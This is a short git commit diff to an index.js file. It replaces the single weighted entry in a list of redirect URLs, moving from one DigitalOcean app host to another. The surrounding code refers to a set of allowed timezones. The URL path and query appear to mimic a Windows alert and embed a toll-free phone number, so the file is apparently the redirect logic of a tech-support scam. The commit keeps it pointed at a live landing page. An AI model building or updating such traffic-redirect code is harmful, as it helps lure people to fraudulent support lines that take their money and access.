bd69cc1e19aef3738bf6e21fb16ffc3ace7c4591
paalakash <palaksh452@gmail.com>
2026-06-17 12:03:20 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://goldfish-app-bkrsy.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5564", weight: 1.0 }
+    { url: "https://uchiha-app-at6au.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5564", weight: 1.0 }
 
 ];
 
